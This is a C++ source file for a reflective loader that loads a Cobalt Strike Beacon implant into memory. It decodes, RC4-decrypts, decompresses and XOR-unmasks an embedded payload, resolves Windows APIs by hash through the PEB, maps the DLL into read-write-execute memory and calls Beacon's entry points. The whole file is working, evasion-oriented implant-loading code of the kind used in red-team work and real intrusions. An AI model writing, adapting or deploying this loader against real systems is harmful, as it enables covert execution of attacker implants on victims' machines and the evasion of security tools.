//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include <intrin.h>
#include <stddef.h>
#include <stdint.h>
#include <windows.h>

#include "ReflectiveLoader.h"
#include "FunctionResolving.h"
#include "StdLib.h"
#include "Utils.h"
#include "TrackMemory.h"

/**
 * The position independent reflective loader
 *
 * @return The target DLL's entry point
*/
extern "C" {
#pragma code_seg(".text$a")
    char* __cdecl ReflectiveLoader() {
        // STEP 0: Determine the start address of the loader
#ifdef _WIN64
        // A rip relative address is calculated in x64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        /*
        * &ReflectiveLoader does not work on x86 as it does not support eip relative addressing
        * Therefore, it is calculated by substracting the function prologue from the current address
        * This is subject to change depending upon the compiler/compiler settings. This could result
        * in issues with Beacon/the postex DLL's cleanup routines. As a result, when writing x86 loaders
        * we strongly recommend verifying that the correct value is subtracted from the result of 
        * GetLocation(). GetLocation() will return the address of the instruction following
        * the function call. In the example below, GetLocation() returns 0x0000000E which is why 
        * we subtract 0xE to get back to 0x0. In our testing, this value can change and can sometimes 
        * cause crashes during cleanup.
        *
        * The generated disassembly from IDA:
        *
        seg000:00000000                 push    ebp
        seg000:00000001                 mov     ebp, esp
        seg000:00000003                 sub     esp, 48h
        seg000:00000006                 push    ebx
        seg000:00000007                 push    esi
        seg000:00000008                 push    edi
        seg000:00000009                 call    GetLocation
        seg000:0000000E                 sub     eax, 11h
        */
        void* loaderStart = (char*)GetLocation() - 0xE;
#endif
        PRINT("[+] Loader Base Address: %p\n", loaderStart);

        /**
        * STEP 1: Determine the base address of whatever we are loading.
        * The following diagram illustrates the layout of the buffer.
        *
        *     ____________________________________Base64 encoded___________________________________________________________________________
        *    |                    |           |  _RC4 encrypted__________________________________________________________________________  |
        *    |                    |           | |  _LZNT1 compressed____________________________________________________________________ | |
        *    |                    |           | | |  ________________________________________________________________________________  | | |
        *    |  UDRL_HEADER_DATA  |  RC4 Key  | | | | PE_HEADER_DATA | Key0 | Key1 | key2 | .text | .rdata | .data | .pdata | .reloc | | | |
        *    |                    |           | | | |________________|______|______|______|_______|________|_______|________|________| | | |
        *    |                    |           | | |____________________________________________________________________________________| | |
        *    |                    |           | |________________________________________________________________________________________| |
        *    |____________________|___________|____________________________________________________________________________________________|
        */
        char* bufferBaseAddress = (char*)FindBufferBaseAddress();
        PRINT("[+] Buffer Base Address: %p\n", bufferBaseAddress);

        //STEP 2: Resolve the functions our loader needs...
        _PPEB pebAddress = GetPEBAddress();
        OBFUSCASTION_LOADER_APIS winApi = { 0 };
        if (!ObfuscationLoaderResolveFunctions(pebAddress, &winApi)) {
            return NULL;
        }
        
        // STEP 3: Identify the RC4 encryption key and the start of the encoded buffer.
        PUDRL_HEADER_DATA udrlHeaderData = (PUDRL_HEADER_DATA)bufferBaseAddress;
        char* rc4EncryptionKey = bufferBaseAddress + sizeof(UDRL_HEADER_DATA);
        char* base64EncodedBuffer = bufferBaseAddress + sizeof(UDRL_HEADER_DATA) + udrlHeaderData->Rc4KeyLength;
        
        /**
        * To handle the encoding/encryption/compression the loader needs to use multiple memory allocations.
        * The following diagram provides a high-level overview of how these allocations are used.
        * 
        * STEP 4: Allocate the memory required for the loaded image as well as a block of temporary memory.
        *
        *                             _loader memory____________________________
        *                            |      ______________________________      |
        *                            |     |                              |     |
        *                            |     | Encoded/Encrypted/Compressed |     |
        *                            |     |            Buffer            |     |
        *                            |     |______________________________|     |
        *                            |______________________|___________________|
        *                                                   |
        *                                                   | STEP 5: Base64 decode and copy buffer to loadedImageMemory.
        *                                                   |
        *                             _loaded image memory__|___________________
        *                            |      _______________\|/____________      |
        *                            |     |     Encrypted/Compressed     |     |
        *                     _____\ |     |             Buffer           |_____|___
        *                    |     / |     |______________________________|     |   |
        *                    |       |      ______________________________      |   |       STEP 6: Decrypt buffer 
        *                    |       |     |      Compressed Buffer       |     |   |   in place in loadedImageMemory.
        *                    |       |     |                              |/____|___|
        *                    |       |     |______________________________|\    |
        * STEPS 8 to 16:     |       |______________________|___________________|
        * Load Beacon        |                              |
        * back into          |                              | STEP 7: Decompress decrypted buffer and save output to temporaryMemory.
        * loadedImageMemory  |       _temporary memory______|___________________
        *                    |       |      _______________\|/____________      |
        *                    |       |     |                              |     |
        *                    |_______|_____|       Raw Beacon DLL         |     |
        *                            |     |                              |     |
        *                            |     |______________________________|     |
        *                            |__________________________________________|
        */

        /**
         * STEP 4: Allocate memory
         * The loadedImageSize is greater than the size of the compressed/encrypted/encoded payload.
         * This means we can safely use loadedImageMemory to decrypt the buffer.
         * 
         * Note: We have also subtracted VIRTUAL_SIZE_OF_PE_HEADER to account for the missing PE header (in the loaded image).
        */
        DWORD modifiedImageSize = udrlHeaderData->LoadedImageSize - VIRTUAL_SIZE_OF_PE_HEADER;
        DWORD initialProtections = PAGE_EXECUTE_READWRITE;
        DWORD loadedImageMemoryType = MEM_PRIVATE;
        char* loadedImageMemory = (char*)winApi.Base.VirtualAlloc(NULL, modifiedImageSize, MEM_RESERVE | MEM_COMMIT, initialProtections);
        

        /**
         * Here we allocate an additional temporary block of memory to store the decompressed buffer.
         * We have used RawFileSize to make sure that there is enough space to hold the decompressed file.
         * We could also reduce this by the SizeOfHeaders (0x400) but it isn't necessary (the memory is temporary).
        */
        char* temporaryMemory = (char*)winApi.Base.VirtualAlloc(NULL, udrlHeaderData->RawFileSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

        // STEP 5: Base64 decode the encoded buffer AND copy it to the loadedImageMemory.
        if (!Base64Decode(base64EncodedBuffer, udrlHeaderData->Base64Size, loadedImageMemory)) {
            return NULL;
        }

        // STEP 6: Decrypt the decoded buffer
        if (!RC4((unsigned char*)loadedImageMemory, udrlHeaderData->CompressedSize, (unsigned char*)rc4EncryptionKey, udrlHeaderData->Rc4KeyLength)) {
            return NULL;
        }

        // STEP 7: Decompressed the decrypted buffer and save the output in temporaryMemory.
        ULONG decompressedSize = 0;
        winApi.RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, (PUCHAR)temporaryMemory, udrlHeaderData->RawFileSize, (PUCHAR)loadedImageMemory, udrlHeaderData->CompressedSize, &decompressedSize);
        if (decompressedSize == 0) {
            PRINT("[-] Failed to decompress Beacon. Exiting..\n");
            return NULL;
        }
        // Create rawDllBaseAddress/loadedDllBaseAddress for simplicity/clarity.
        char* loadedDllBaseAddress = loadedImageMemory;
        char* rawDllBaseAddress = temporaryMemory;

        // STEP 8: Determine the PE_HEADER_DATA structure and XOR keys.
        PPE_HEADER_DATA peHeaderData = (PPE_HEADER_DATA)rawDllBaseAddress;
        XOR_KEYS xorKeys;
        xorKeys.TextSection.key = rawDllBaseAddress + sizeof(PE_HEADER_DATA);
        xorKeys.TextSection.keyLength = peHeaderData->TextSectionXORKeyLength;
        xorKeys.RdataSection.key = xorKeys.TextSection.key + peHeaderData->TextSectionXORKeyLength;
        xorKeys.RdataSection.keyLength = peHeaderData->RdataSectionXORKeyLength;
        xorKeys.DataSection.key = xorKeys.RdataSection.key + peHeaderData->RdataSectionXORKeyLength;
        xorKeys.DataSection.keyLength = peHeaderData->DataSectionXORKeyLength;

        // Adjust rawDllBaseAddress to point to the start of the RAW DLL.
        rawDllBaseAddress = rawDllBaseAddress + sizeof(PE_HEADER_DATA) + peHeaderData->TextSectionXORKeyLength + peHeaderData->RdataSectionXORKeyLength + peHeaderData->DataSectionXORKeyLength;

        // STEP 9: Offset the rawDllBaseAddress and loadedDllBaseAddress to account for Beacon's missing PE header,
        rawDllBaseAddress -= peHeaderData->SizeOfHeaders;
        loadedDllBaseAddress -= VIRTUAL_SIZE_OF_PE_HEADER;

        /* STEP 10: Create Beacon User Data
         * 
         * Note: We cannot initialize the BUD structure using '= { 0 }'
         * as the compiler may generate a memset function call.
        */
        USER_DATA userData;
        ALLOCATED_MEMORY allocatedMemory;
        _memset(&userData, 0, sizeof(userData));
        _memset(&allocatedMemory, 0, sizeof(allocatedMemory));
        userData.allocatedMemory = &allocatedMemory;

        // Set the version (4.10)
        userData.version = COBALT_STRIKE_VERSION;

        /**
        * STEP 11: Track the allocated memory block
        * See bud-loader for more comprehensive example/description of tracking memory
        */
        ALLOCATED_MEMORY_CLEANUP_INFORMATION cleanupMemoryInformation;
        _memset(&cleanupMemoryInformation, 0, sizeof(ALLOCATED_MEMORY_CLEANUP_INFORMATION));
        cleanupMemoryInformation.AllocationMethod = ALLOCATED_MEMORY_ALLOCATION_METHOD::METHOD_VIRTUALALLOC;
        cleanupMemoryInformation.Cleanup = FALSE;
        TrackAllocatedMemoryRegion(&userData.allocatedMemory->AllocatedMemoryRegions[0], ALLOCATED_MEMORY_PURPOSE::PURPOSE_BEACON_MEMORY, (PVOID)loadedImageMemory, modifiedImageSize, loadedImageMemoryType, &cleanupMemoryInformation);

        /**
        * STEP 12: Copy in our PE header and sections 
        * 
        * Note: ObfuscationLoaderCopySections also tracks each section
        * to provide accurate information to the Sleepmask.
        * 
        * See bud-loader for more comprehensive example/description of tracking memory
        */
        ObfuscationLoaderCopySections(&userData.allocatedMemory->AllocatedMemoryRegions[0], peHeaderData, &xorKeys, rawDllBaseAddress, loadedDllBaseAddress, modifiedImageSize, initialProtections, ALLOCATED_MEMORY_MASK_MEMORY_BOOL::MASK_TRUE);

        // STEP 13: Process the target DLL's import table...
        ObfuscationLoaderResolveImports(peHeaderData, loadedDllBaseAddress, &winApi.Base);

        // STEP 14: Process the target DLL's relocations...
        ObfuscationLoaderProcessRelocations(peHeaderData, loadedDllBaseAddress);
 
        // STEP 15: Find the target DLL's entry point.
        char* entryPoint = loadedDllBaseAddress + peHeaderData->entryPoint;
        PRINT("[+] Entry point: %p \n", entryPoint);

        // STEP 16: Free Temporary Memory (used the original variable name temporaryMemory for clarity).
        winApi.VirtualFree(temporaryMemory, 0, MEM_RELEASE);

        /** 
         * STEP 17: Call the target DLL's entry point
         * We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
        */
        winApi.Base.NtFlushInstructionCache((HANDLE)-1, NULL, 0);

        // STEP 18: Pass Beacon User Data to Beacon
        PRINT("[*] Calling the entry point (DLL_BEACON_USER_DATA)\n");
        ((DLLMAIN)entryPoint)(0, DLL_BEACON_USER_DATA, &userData);

        // STEP 19: Call Beacon entrypoint(s)
        PRINT("[*] Calling the entry point (DLL_PROCESS_ATTACH)\n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, NULL);
        PRINT("[*] Calling the entry point (DLL_BEACON_START)\n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, 4, NULL);

        // STEP 20: Return our new entry point address so whatever called us can call DllMain() if needed.
         return entryPoint;
    }
}

/*******************************************************************
 * To avoid problems with function positioning, do not add any new 
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$b")

/**
 * Resolve the functions required by obfuscation-loader to load our target DLL succesfully.
 *
 * Note: This is a wrapper around the library function ResolveBaseLoaderFunctions().
 * 
 * @param pebAddress A pointer to the Process Environment Block (PEB).
 * @param winApi A pointer to a structure of WINAPI pointers.
 * @return A Boolean value to indicate success.
*/
BOOL ObfuscationLoaderResolveFunctions(_PPEB pebAddress, POBFUSCATION_LOADER_APIS winApi) {
    if (!ResolveBaseLoaderFunctions(pebAddress, &winApi->Base)) {
        return FALSE;
    }
    winApi->VirtualFree = (VIRTUALFREE)GetProcAddressByHash(pebAddress, KERNEL32DLL_HASH, VIRTUALFREE_HASH);
    if (winApi->VirtualFree == NULL) {
        PRINT("[-] Failed to find address of key loader function. Exiting..\n");
        return FALSE;
    }
    winApi->RtlDecompressBuffer = (RTLDECOMPRESSBUFFER)GetProcAddressByHash(pebAddress, NTDLLDLL_HASH, RTLDECOMPRESSBUFFER_HASH);
    if (winApi->RtlDecompressBuffer == NULL) {
        PRINT("[-] Failed to find address of key loader function. Exiting..\n");
        return FALSE;
    }
    return TRUE;
}

/**
 * Copy the target DLL's sections into the newly allocated memory
 * 
 * Note: This is not a library function, it is specific to the obfuscation-loader as it uses PE_HEADER_DATA and XOR_KEYS
 * 
 * @param allocatedMemoryRegion A pointer to the MEMORY_INFORMATION_REGION structure
 * @param peHeaderData A pointer to a structure that contains PE header information
 * @param xorKeys A pointer to a structure that contains XOR key information
 * @param srcImage A pointer to the base address of the target DLL
 * @param dstAddress A pointer to the start address of the DLL's new location in memory
 * @param modifiedImageSize The size used to allocate the DLL's new location in memory
 * @param memoryProtections An enum to define memory protections
 * @param mask An enum to indicate whether sections should be masked
*/
void ObfuscationLoaderCopySections(PALLOCATED_MEMORY_REGION allocatedMemoryRegion, PPE_HEADER_DATA peHeaderData, PXOR_KEYS xorKeys, char* srcImage, char* dstAddress, DWORD modifiedImageSize, DWORD memoryProtections, ALLOCATED_MEMORY_MASK_MEMORY_BOOL mask) {
    PRINT("[+] Copying Sections...\n");

    // Declare a variable for section number and increment it to account for .pdata in _WIN64
    int sectionNumber = 0;
 
    // Copy .text section
    ObfuscationLoaderCopySection(dstAddress, srcImage, &peHeaderData->Text);
    // XOR loaded .text section
    ObfuscationLoaderXORSection(dstAddress, &peHeaderData->Text, &xorKeys->TextSection);
    // Save the memory information to Beacon User Data
    TrackAllocatedMemorySection(&allocatedMemoryRegion->Sections[sectionNumber], LABEL_TEXT, dstAddress + peHeaderData->Text.VirtualAddress, peHeaderData->Text.SizeOfRawData, memoryProtections, mask);
    sectionNumber++;

    // Copy .rdata section
    ObfuscationLoaderCopySection(dstAddress, srcImage, &peHeaderData->Rdata);
    // XOR loaded .rdata section
    ObfuscationLoaderXORSection(dstAddress, &peHeaderData->Rdata, &xorKeys->RdataSection);
    // Save the memory information to Beacon User Data
    TrackAllocatedMemorySection(&allocatedMemoryRegion->Sections[sectionNumber], LABEL_RDATA, dstAddress + peHeaderData->Rdata.VirtualAddress, peHeaderData->Rdata.SizeOfRawData, memoryProtections, mask);
    sectionNumber++;

    // Copy .data section
    ObfuscationLoaderCopySection(dstAddress, srcImage, &peHeaderData->Data);
    // XOR loaded .data section
    ObfuscationLoaderXORSection(dstAddress, &peHeaderData->Data, &xorKeys->DataSection);
    // Save the memory information to Beacon User Data
    TrackAllocatedMemorySection(&allocatedMemoryRegion->Sections[sectionNumber], LABEL_DATA, dstAddress + peHeaderData->Data.VirtualAddress, peHeaderData->Data.SizeOfRawData, memoryProtections, mask);
    sectionNumber++;

#ifdef _WIN64
    // Copy .pdata section
    ObfuscationLoaderCopySection(dstAddress, srcImage, &peHeaderData->Pdata);
    // Save the memory information to Beacon User Data
    TrackAllocatedMemorySection(&allocatedMemoryRegion->Sections[sectionNumber], LABEL_PDATA, dstAddress + peHeaderData->Pdata.VirtualAddress, peHeaderData->Pdata.SizeOfRawData, memoryProtections, mask);
    sectionNumber++;
#endif

    // Copy .reloc section
    ObfuscationLoaderCopySection(dstAddress, srcImage, &peHeaderData->Reloc);
    // Save the memory information to Beacon User Data
    TrackAllocatedMemorySection(&allocatedMemoryRegion->Sections[sectionNumber], LABEL_RELOC, dstAddress + peHeaderData->Reloc.VirtualAddress, peHeaderData->Reloc.SizeOfRawData, memoryProtections, mask);
    sectionNumber++;

    return;
}

/**
 * A wrapper around _memcpy to simplify copying PE sections
 * 
 * Note: This is not a library function, it is specific to the obfuscation-loader as it uses PSECTION_INFORMATION
 * 
 * @param dstAddress A pointer to the start address of the DLL's new location in memory
 * @param srcImage A pointer to the base address of the target DLL
 * @param section A pointer to a structure that contains the section information
*/
void ObfuscationLoaderCopySection(char* dstAddress, char* srcImage, PSECTION_INFORMATION section) {
    _memcpy(dstAddress + section->VirtualAddress, srcImage + section->PointerToRawData, section->SizeOfRawData);
    return;
}

/**
 * A wrapper around XORData to simplify unmasking sections
 *
 * Note: This is not a library function, it is specific to the obfuscation-loader as it uses PSECTION_INFORMATION and PKEY_INFO
 * 
 * @param dstAddress A pointer to the start address of the DLL's new location in memory
 * @param section A pointer to a structure that contains the section information
 * @param keyInfo A pointer to a structure that contains the XOR key information
*/
void ObfuscationLoaderXORSection(char* dstAddress, PSECTION_INFORMATION section, PKEY_INFO keyInfo) {
    XORData((char*)dstAddress + section->VirtualAddress, section->SizeOfRawData, keyInfo->key, keyInfo->keyLength);
    return;
}

/**
 * Resolve the target DLL's imported functions
 * 
 * Note: This is not a library function, it is specific to the obfuscation-loader as it uses PE_HEADER_DATA
 * 
 * @param peHeaderData A pointer to a structure that contains PE header information
 * @param dstAddress A pointer to the start address of the DLL's new location in memory
 * @param winApi A pointer to a structure of WINAPI pointers
*/
void ObfuscationLoaderResolveImports(PPE_HEADER_DATA peHeaderData, char* dstAddress, PWINDOWSAPIS winApi) {
    PRINT("[*] Resolving Imports... \n");

    /** 
    * We assume there is an import table to process
    * importDescriptor is the first importDescriptor entry in the import table
    */
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(dstAddress + peHeaderData->DataDirectoryRVA);
    // Itterate through all imports
    while (importDescriptor->Name) {
        LPCSTR libraryName = (LPCSTR)(dstAddress + importDescriptor->Name);
        // Use LoadLibraryA to load the imported module into memory
        ULONG_PTR libraryBaseAddress = (ULONG_PTR)winApi->LoadLibraryA(libraryName);

        PRINT("[+] Loaded Module: %s\n", (char*)libraryName);

        // INT = VA of the Import Name Table (OriginalFirstThunk)
        PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)(dstAddress + importDescriptor->OriginalFirstThunk);
        // IAT = VA of the Import Address Table (FirstThunk)
        PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)(dstAddress + importDescriptor->FirstThunk);

        // Itterate through all imported functions, importing by ordinal if no name present
        while (DEREF(IAT)) {
            // Sanity check INT as some compilers only import by FirstThunk
            if (INT && INT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                // Get the VA of the modules NT Header
                PIMAGE_NT_HEADERS libraryPEHeader = (PIMAGE_NT_HEADERS)(libraryBaseAddress + ((PIMAGE_DOS_HEADER)libraryBaseAddress)->e_lfanew);

                PIMAGE_DATA_DIRECTORY exportDataDirectoryEntry = &(libraryPEHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

                // Get the VA of the export directory
                PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(libraryBaseAddress + exportDataDirectoryEntry->VirtualAddress);

                // Get the VA for the array of addresses
                ULONG_PTR addressArray = libraryBaseAddress + exportDirectory->AddressOfFunctions;

                // Use the import ordinal (- export ordinal base) as an index into the array of addresses
                addressArray += (IMAGE_ORDINAL(INT->u1.Ordinal) - exportDirectory->Base) * sizeof(DWORD);

                // Patch in the address for this imported function
                PRINT("\t[*] Ordinal: %d\tAddress: %p\n", INT->u1.Ordinal, libraryBaseAddress + DEREF_32(addressArray));
                DEREF(IAT) = libraryBaseAddress + DEREF_32(addressArray);
            }
            else {
                // Get the VA of this functions import by name struct
                PIMAGE_IMPORT_BY_NAME importName = (PIMAGE_IMPORT_BY_NAME)(dstAddress + DEREF(IAT));
                LPCSTR functionName = importName->Name;

                // Use GetProcAddress and patch in the address for this imported function
                ULONG_PTR functionAddress = (ULONG_PTR)winApi->GetProcAddress((HMODULE)libraryBaseAddress, functionName);
                PRINT("\t[*] Function: %s\tAddress: %p\n", (char*)functionName, functionAddress);
                DEREF(IAT) = functionAddress;
            }
            // Get the next imported function
            ++IAT;
            if (INT) {
                ++INT;
            }
        }
        // Get the next import
        importDescriptor++;
    }
    return;
}

/**
 * Calculate the base address delta and perform relocations
 *
 * Note: This is not a library function, it is specific to obfuscation-loader as it uses PE_HEADER_DATA
 * 
 * @param peHeaderData A pointer to a structure that contains PE header information
 * @param dstAddress A pointer to the start address of the DLL's new location in memory
*/
void ObfuscationLoaderProcessRelocations(PPE_HEADER_DATA peHeaderData, char* dstAddress) {
    PRINT("[*] Processing relocations... \n");
     
    // Calculate the base address delta
    ULONG_PTR delta = (ULONG_PTR)dstAddress - (unsigned __int3264)peHeaderData->ImageBase;
    PRINT("[+] Delta: 0x%X \n", delta);

    // Check if there are any relocations present
    if (peHeaderData->RelocDirectorySize) {
        // baseRelocation is the first entry (IMAGE_BASE_RELOCATION)
        PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(dstAddress + peHeaderData->RelocDirectoryRVA);
        PRINT("[*] Base Relocation: %p\n", baseRelocation);

        // Itterate through all entries...
        while (baseRelocation->SizeOfBlock) {
            // relocationBlock = the VA for this relocation block
            char* relocationBlock = (dstAddress + baseRelocation->VirtualAddress);
            PRINT("\t[*] Relocation Block: %p\n", relocationBlock);

            // relocationCount = number of entries in this relocation block
            ULONG_PTR relocationCount = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

            // relocation is the first entry in the current relocation block
            PIMAGE_RELOC relocation = (PIMAGE_RELOC)((ULONG_PTR)baseRelocation + sizeof(IMAGE_BASE_RELOCATION));

            // We itterate through all the entries in the current block...
            while (relocationCount--) {
                /**
                * PRINT("\t\t[*] Relocation - type: %x offset: %x\n", ((PIMAGE_RELOC)relocation)->type, ((PIMAGE_RELOC)relocation)->offset);
                * Perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                * We dont use a switch statement to avoid the compiler building a jump table
                * which would not be very position independent!
                */
                if ((relocation)->type == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR*)(relocationBlock + relocation->offset) += delta;
                else if (relocation->type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD*)(relocationBlock + relocation->offset) += (DWORD)delta;
                else if (relocation->type == IMAGE_REL_BASED_HIGH)
                    *(WORD*)(relocationBlock + relocation->offset) += HIWORD(delta);
                else if (relocation->type == IMAGE_REL_BASED_LOW)
                    *(WORD*)(relocationBlock + relocation->offset) += LOWORD(delta);
                // Get the next entry in the current relocation block
                relocation++;
            }
            // Get the next entry in the relocation directory
            baseRelocation = (PIMAGE_BASE_RELOCATION)((char*)baseRelocation + baseRelocation->SizeOfBlock);
        }
    }
    return;
}
